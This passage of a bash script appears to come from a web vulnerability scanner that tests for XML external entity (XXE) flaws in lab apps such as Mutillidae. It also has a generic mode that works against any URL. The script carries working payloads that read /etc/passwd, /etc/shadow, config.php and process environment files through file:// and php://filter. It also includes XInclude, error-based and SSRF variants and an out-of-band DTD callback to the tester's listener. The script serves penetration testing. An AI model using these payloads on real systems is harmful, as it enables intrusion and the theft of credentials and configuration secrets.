            >&2 echo -e "${CYAN}[*] Testing Mutillidae XXE endpoints${NC}"
            echo "--- Mutillidae XXE Tests ---"
            echo "Base    : $mutil_base"
            echo "Sink    : POST $xxe_url"
            echo "Param   : xml="
            echo ""

            # ── Helper: send XML to Mutillidae validator ──────────────────
            # Sends XML as url-encoded POST body parameter 'xml'
            send_xml() {
                local xml_payload="$1"
                curl -s -L --max-time 10 \
                    -X POST \
                    --data-urlencode "xml=${xml_payload}" \
                    --data-urlencode "xml-validator-php-submit-button=Validate XML" \
                    "$xxe_url" 2>/dev/null
            }

            # ── TEST 1: Basic entity probe — confirm XML is parsed ────────
            echo "  [TEST 1] Basic internal entity — confirm XML parsing"
            local basic_xml='<?xml version="1.0"?><!DOCTYPE test [<!ENTITY probe "ARGUS_XXE_PROBE">]><test>&probe;</test>'
            local basic_resp
            basic_resp=$(send_xml "$basic_xml")
            if echo "$basic_resp" | grep -q "ARGUS_XXE_PROBE"; then
                echo "    RESULT: XML parser is active — internal entity resolved ✓"
                {
                    echo "[INFO] XML Parser Active — entity expansion confirmed"
                    echo "  Tool     : custom_tests"
                    echo "  Target   : $mutil_base (Mutillidae)"
                    echo "  Test     : Internal entity resolution"
                    echo "  Evidence : &probe; entity resolved to 'ARGUS_XXE_PROBE' in response"
                    echo "  Note     : Confirms XML is parsed — prerequisite for XXE"
                    echo ""
                } >> "$findings_file"
            else
                echo "    RESULT: entity not reflected (may be sanitized)"
            fi
            echo ""

            # ── TEST 2: In-band file read — file:///etc/passwd ────────────
            echo "  [TEST 2] In-band file read — file:///etc/passwd"
            local passwd_xml
            passwd_xml='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            local passwd_resp
            passwd_resp=$(send_xml "$passwd_xml")
            if echo "$passwd_resp" | grep -qE "root:x:0:0|daemon:x|/bin/bash|/bin/sh|nobody:x"; then
                echo "    RESULT: XXE CONFIRMED — /etc/passwd content in response ✓"
                local passwd_preview
                passwd_preview=$(echo "$passwd_resp" | grep -oE "root:[^<]+" | head -1)
                {
                    echo "[CRITICAL] XXE Confirmed — Direct File Read"
                    echo "  Tool     : custom_tests"
                    echo "  Target   : $mutil_base (Mutillidae)"
                    echo "  URL      : $xxe_url"
                    echo "  Param    : xml"
                    echo "  Payload  : file:///etc/passwd"
                    echo "  Evidence : /etc/passwd content found: ${passwd_preview}"
                    echo "  Severity : CRITICAL"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
            else
                echo "    RESULT: /etc/passwd not in response"
            fi
            echo ""

            # ── TEST 3: PHP filter — base64-encoded file read ─────────────
            # php://filter bypasses XML special char issues in file content
            # The base64 blob appears in the response and we decode it
            echo "  [TEST 3] PHP filter base64 — php://filter/convert.base64-encode"
            local filter_xml
            filter_xml='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'
            local filter_resp
            filter_resp=$(send_xml "$filter_xml")
            # Look for a base64 blob (long alphanum string) in the response
            local b64_blob
            b64_blob=$(echo "$filter_resp" | grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | head -1)
            if [[ -n "$b64_blob" ]]; then
                local decoded
                decoded=$(echo "$b64_blob" | base64 -d 2>/dev/null)
                if echo "$decoded" | grep -qE "root:|daemon:|bin:|/bin/sh|/bin/bash"; then
                    echo "    RESULT: XXE CONFIRMED — PHP filter base64 file read ✓"
                    echo "    Decoded: $(echo "$decoded" | head -2 | tr '\n' ' ')"
                    {
                        echo "[CRITICAL] XXE Confirmed — PHP Filter File Read (Base64)"
                        echo "  Tool     : custom_tests"
                        echo "  Target   : $mutil_base (Mutillidae)"
                        echo "  URL      : $xxe_url"
                        echo "  Param    : xml"
                        echo "  Payload  : php://filter/convert.base64-encode/resource=/etc/passwd"
                        echo "  Evidence : Base64 decoded /etc/passwd content confirmed"
                        echo "  Preview  : $(echo "$decoded" | head -2 | tr '\n' '|')"
                        echo "  Severity : CRITICAL"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                else
                    echo "    RESULT: base64 blob found but decoded content not /etc/passwd"
                fi
            else
                echo "    RESULT: no base64 blob in response"
            fi
            echo ""

            # ── TEST 4: Additional sensitive files ────────────────────────
            echo "  [TEST 4] Additional file reads"
            local extra_files=(
                "file:///etc/hosts"
                "file:///etc/hostname"
                "file:///proc/version"
                "file:///proc/self/environ"
                "php://filter/convert.base64-encode/resource=/var/www/html/config.php"
                "php://filter/convert.base64-encode/resource=/etc/shadow"
            )
            local confirm_patterns=(
                "127\.0\.0\.1|localhost"
                "[a-zA-Z0-9-]{2,}"
                "Linux version|linux version"
                "PATH=|HOME=|USER="
                "[A-Za-z0-9+/]{40,}"
                "[A-Za-z0-9+/]{40,}"
            )
            local file_names=(
                "/etc/hosts"
                "/etc/hostname"
                "/proc/version"
                "/proc/self/environ"
                "/var/www/html/config.php"
                "/etc/shadow"
            )
            for i in "${!extra_files[@]}"; do
                local uri="${extra_files[$i]}"
                local pattern="${confirm_patterns[$i]}"
                local fname="${file_names[$i]}"
                echo -n "    $fname... "
                local file_xml
                file_xml="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"${uri}\">]><foo>&xxe;</foo>"
                local file_resp
                file_resp=$(send_xml "$file_xml")

                # Check if it's a base64 URI
                if echo "$uri" | grep -q "base64-encode"; then
                    local b64
                    b64=$(echo "$file_resp" | grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | head -1)
                    if [[ -n "$b64" ]]; then
                        local dec
                        dec=$(echo "$b64" | base64 -d 2>/dev/null | strings | head -3 | tr '\n' ' ')
                        echo "READ ✓ (base64) — $dec"
                        {
                            echo "[HIGH] XXE File Read Confirmed — $fname"
                            echo "  Tool     : custom_tests"
                            echo "  Target   : $mutil_base (Mutillidae)"
                            echo "  Payload  : $uri"
                            echo "  Preview  : $dec"
                            echo "  Severity : HIGH"
                            echo ""
                        } >> "$findings_file"
                        echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                    else
                        echo "not readable"
                    fi
                else
                    if echo "$file_resp" | grep -qE "$pattern"; then
                        local preview
                        preview=$(echo "$file_resp" | grep -oE "$pattern" | head -1)
                        echo "READ ✓ — $preview"
                        {
                            echo "[HIGH] XXE File Read Confirmed — $fname"
                            echo "  Tool     : custom_tests"
                            echo "  Target   : $mutil_base (Mutillidae)"
                            echo "  Payload  : $uri"
                            echo "  Preview  : $preview"
                            echo "  Severity : HIGH"
                            echo ""
                        } >> "$findings_file"
                        echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                    else
                        echo "not readable"
                    fi
                fi
            done
            echo ""

            # ── TEST 5: OOB XXE via external DTD callback ─────────────────
            echo "  [TEST 5] OOB XXE — external DTD callback (blind detection)"
            local oob_xml
            oob_xml="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM \"http://${local_ip}:${oob_port}/xxe.dtd\">%remote;]><foo>test</foo>"
            echo -n "    Sending OOB payload to trigger callback... "
            send_xml "$oob_xml" > /dev/null
            sleep 2
            if grep -q "OOB_HIT" "$oob_log" 2>/dev/null; then
                echo "OOB CALLBACK RECEIVED ✓"
                local hit_path
                hit_path=$(grep "OOB_HIT" "$oob_log" | head -1)
                {
                    echo "[HIGH] XXE OOB Callback Confirmed"
                    echo "  Tool     : custom_tests"
                    echo "  Target   : $mutil_base (Mutillidae)"
                    echo "  Method   : Out-of-band external DTD callback"
                    echo "  Evidence : HTTP request received: $hit_path"
                    echo "  Severity : HIGH"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
            else
                echo "no callback (OOB may be blocked or parser ignores param entities)"
            fi
            echo ""

            # ── TEST 6: XInclude probe ─────────────────────────────────────
            # XInclude works when user data is embedded INSIDE server XML
            # (not the outer DOCTYPE level) — useful if DOCTYPE injection is blocked
            echo "  [TEST 6] XInclude injection"
            local xi_xml
            xi_xml='<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
            local xi_resp
            xi_resp=$(send_xml "$xi_xml")
            if echo "$xi_resp" | grep -qE "root:x:0:0|daemon:x|/bin/bash"; then
                echo "    RESULT: XInclude XXE CONFIRMED ✓"
                {
                    echo "[CRITICAL] XXE via XInclude Confirmed"
                    echo "  Tool     : custom_tests"
                    echo "  Target   : $mutil_base (Mutillidae)"
                    echo "  Method   : XInclude text inclusion"
                    echo "  Evidence : /etc/passwd content returned"
                    echo "  Severity : CRITICAL"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
            else
                echo "    RESULT: XInclude not triggered"
            fi
            echo ""

            # ── TEST 7: Error-based XXE ───────────────────────────────────
            # Inject file content into an error message path
            echo "  [TEST 7] Error-based XXE — file path in error message"
            local err_xml
            err_xml='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '"'"'file:///nonexistent/%file;'"'"'>">%eval;%error;]><foo>test</foo>'
            local err_resp
            err_resp=$(send_xml "$err_xml")
            if echo "$err_resp" | grep -qE "root:x:0:0|failed to load external entity.*root"; then
                echo "    RESULT: Error-based XXE CONFIRMED ✓"
                {
                    echo "[HIGH] Error-based XXE Confirmed"
                    echo "  Tool     : custom_tests"
                    echo "  Target   : $mutil_base (Mutillidae)"
                    echo "  Method   : Parameter entity error message leakage"
                    echo "  Evidence : File content visible in error message"
                    echo "  Severity : HIGH"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
            else
                echo "    RESULT: no file content in error"
            fi
            echo ""

            # ── TEST 8: XXE SSRF — internal HTTP request ──────────────────
            echo "  [TEST 8] XXE-based SSRF — internal HTTP probe"
            local ssrf_xml
            ssrf_xml="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><foo>&xxe;</foo>"
            echo -n "    Probing http://127.0.0.1/ via XXE entity... "
            local ssrf_resp
            ssrf_resp=$(send_xml "$ssrf_xml")
            if echo "$ssrf_resp" | grep -qiE "html|http|server|localhost|index|apache|nginx"; then
                echo "SSRF CONFIRMED ✓ (XXE entity fetched internal HTTP resource)"
                {
                    echo "[HIGH] XXE-Based SSRF Confirmed"
                    echo "  Tool     : custom_tests"
                    echo "  Target   : $mutil_base (Mutillidae)"
                    echo "  Method   : XXE entity → http://127.0.0.1/"
                    echo "  Evidence : HTTP response content in XML response"
                    echo "  Severity : HIGH"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
            else
                echo "no SSRF response"
            fi

        # ================================================================
        # DVWA — no native XXE page
        # ================================================================
        elif [[ "$TARGET_TYPE" == "dvwa" ]]; then
            >&2 echo -e "${YELLOW}[!] DVWA has no native XXE vulnerability page${NC}"
            >&2 echo -e "${YELLOW}    For XXE testing use Mutillidae: http://<ip>/mutillidae${NC}"
            echo "--- DVWA XXE ---"
            echo "SKIPPED: DVWA on BWA does not have an XXE vulnerability page."
            echo "For XXE testing, target Mutillidae: http://192.168.18.70/mutillidae"

        # ================================================================
        # GENERIC — probe common XML endpoints
        # ================================================================
        else
            >&2 echo -e "${CYAN}[*] Testing generic target for XXE${NC}"
            echo "--- Generic XXE Tests ---"

            local base_url
            base_url=$(echo "$target" | cut -d'?' -f1)

            # Payloads to try on any endpoint accepting XML
            local test_payloads=(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'
                '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
            )
            local payload_names=("Direct file read" "PHP filter" "XInclude")
            local content_types=("application/xml" "application/xml" "text/xml")

            for i in "${!test_payloads[@]}"; do
                echo -n "  [${payload_names[$i]}] POST with Content-Type: ${content_types[$i]}... "
                local resp
                resp=$(curl -s -L --max-time 10 \
                    -X POST \
                    -H "Content-Type: ${content_types[$i]}" \
                    -d "${test_payloads[$i]}" \
                    "$base_url" 2>/dev/null)

                local confirmed=0
                if echo "$resp" | grep -qE "root:x:0:0|daemon:x|/bin/bash|/bin/sh"; then
                    echo "CONFIRMED ✓"
                    confirmed=1
                elif echo "$resp" | grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | head -1 | \
                        base64 -d 2>/dev/null | grep -qE "root:|daemon:|bin:"; then
                    echo "CONFIRMED (base64) ✓"
                    confirmed=1
                else
                    echo "not vulnerable"
                fi

                if [[ $confirmed -eq 1 ]]; then
                    {
                        echo "[CRITICAL] XXE Confirmed — ${payload_names[$i]}"
                        echo "  Tool     : custom_tests"
                        echo "  URL      : $base_url"
                        echo "  Method   : ${payload_names[$i]}"
                        echo "  Severity : CRITICAL"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                fi
            done

            # OOB probe for generic targets
            echo -n "  [OOB probe] DOCTYPE external DTD callback to ${local_ip}:${oob_port}... "
            local oob_xml
            oob_xml="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM \"http://${local_ip}:${oob_port}/xxe.dtd\">%remote;]><foo>test</foo>"
            curl -s -L --max-time 10 \
                -X POST \
                -H "Content-Type: application/xml" \
                -d "$oob_xml" \
                "$base_url" > /dev/null 2>&1
            sleep 2
            if grep -q "OOB_HIT" "$oob_log" 2>/dev/null; then
                echo "OOB CALLBACK RECEIVED ✓"
                {
                    echo "[HIGH] XXE OOB Callback Confirmed"
                    echo "  Tool     : custom_tests"
                    echo "  URL      : $base_url"
                    echo "  Evidence : HTTP callback to OOB listener received"
                    echo "  Severity : HIGH"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
            else
                echo "no callback"
            fi
        fi

        local final_count
        final_count=$(cat "$counter_file")
        echo ""
        echo "Custom XXE tests completed with $final_count findings"

    } > "$out" 2>&1

    # Stop OOB listener
    kill "$oob_pid" 2>/dev/null
    wait "$oob_pid" 2>/dev/null
    rm -f "$oob_log"
    rm -rf "$oob_serve_dir"

    local custom_findings
    custom_findings=$(cat "$counter_file")
    rm -f "$counter_file"

    show_step "$step" "$total" "Custom Tests" "complete"
    update_progress "Custom tests completed ($custom_findings findings)"
    echo "$custom_findings" > "$TEMP_DIR/custom_xxe_count.tmp"
}

# ================================================
# MAIN XXE SCAN FUNCTION
# ================================================
scan_xxe() {
    local target=$1 output_dir=$2 selected_tools=$3
    mkdir -p "$output_dir"/{raw_output,findings}
    local findings_file="$output_dir/findings/xxe_findings.txt"
    local summary_file="$output_dir/raw_output/xxe_summary.txt"

    detect_target_type "$target"
    [[ "$TARGET_TYPE" == "dvwa" ]] && dvwa_autologin "$DVWA_BASE"

    {
        echo "========================================"
        echo "XXE SCAN RESULTS"
        echo "========================================"
        echo "Target     : $target"
        echo "TargetType : $TARGET_TYPE"
        echo "Date       : $(date)"
        echo "Tools used : $selected_tools"
        echo "========================================"
        echo ""
    } > "$findings_file"

    >&2 echo -e "${CYAN}\n┌─────────────────────────────────────────────────────────────────────┐"
    >&2 echo -e "│                  XXE VULNERABILITY SCANNER                         │"
    >&2 echo -e "└─────────────────────────────────────────────────────────────────────┘${NC}"
    >&2 echo -e "${YELLOW}[*] Target     : $target${NC}"
    >&2 echo -e "${YELLOW}[*] Target type: $TARGET_TYPE${NC}"
    >&2 echo -e "${YELLOW}[*] Tools      : $selected_tools${NC}\n"

    IFS=' ' read -ra TOOL_ARRAY <<< "$selected_tools"
    local total_tools=${#TOOL_ARRAY[@]}
    init_progress $total_tools
    local total_findings=0 tools_run=0 tools_success=0

    for tool in "${TOOL_ARRAY[@]}"; do
        tools_run=$((tools_run+1))
        local tool_output="$output_dir/raw_output/${tool}_xxe.txt"
        local tool_findings=0

        case $tool in
            "xxeinjector")
                if run_xxeinjector "$target" "$tool_output" "$findings_file" \
                        "$tools_run" "$total_tools"; then
                    tools_success=$((tools_success+1))
                fi
                if [[ -f "$TEMP_DIR/xxeinjector_count.tmp" ]]; then
                    tool_findings=$(cat "$TEMP_DIR/xxeinjector_count.tmp")
                    rm -f "$TEMP_DIR/xxeinjector_count.tmp"
                fi
                ;;
            "custom_tests")
                run_custom_xxe_tests "$target" "$tool_output" "$findings_file" \
                    "$tools_run" "$total_tools"
                tools_success=$((tools_success+1))
                if [[ -f "$TEMP_DIR/custom_xxe_count.tmp" ]]; then
                    tool_findings=$(cat "$TEMP_DIR/custom_xxe_count.tmp")
                    rm -f "$TEMP_DIR/custom_xxe_count.tmp"
                fi
                ;;
            *)
                >&2 echo -e "${YELLOW}[!] Unknown tool: $tool${NC}"
                ;;
        esac

        [[ "$tool_findings" =~ ^[0-9]+$ ]] || tool_findings=0
        total_findings=$((total_findings + tool_findings))
        echo "$tool findings: $tool_findings" >> "$findings_file"
        >&2 echo ""
    done

    {
        echo ""
        echo "========================================"
        echo "SCAN SUMMARY"
        echo "========================================"
        echo "Tools run       : $tools_run"
        echo "Tools successful: $tools_success"
        echo "Total findings  : $total_findings"
        echo "========================================"
    } >> "$findings_file"

    rm -rf "$TEMP_DIR"
    echo "$total_findings" > "$summary_file"
    complete_progress
    >&2 echo -e "${GREEN}[✓] XXE scan completed${NC}"
    >&2 echo -e "${YELLOW}[*] Tools run: $tools_run/$total_tools${NC}"
    >&2 echo -e "${RED}[*] Total findings: $total_findings${NC}\n"
    echo "$total_findings"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    [[ $# -lt 3 ]] && {
        >&2 echo -e "${RED}[!] Usage: $0 <target_url> <output_dir> <selected_tools>${NC}"
        >&2 echo -e "${YELLOW}    Example: $0 http://192.168.18.70/mutillidae /tmp/results 'xxeinjector custom_tests'${NC}"
        exit 1
    }
    findings=$(scan_xxe "$1" "$2" "$3")
    echo "FINDINGS_COUNT=$findings"
    exit 0
fi
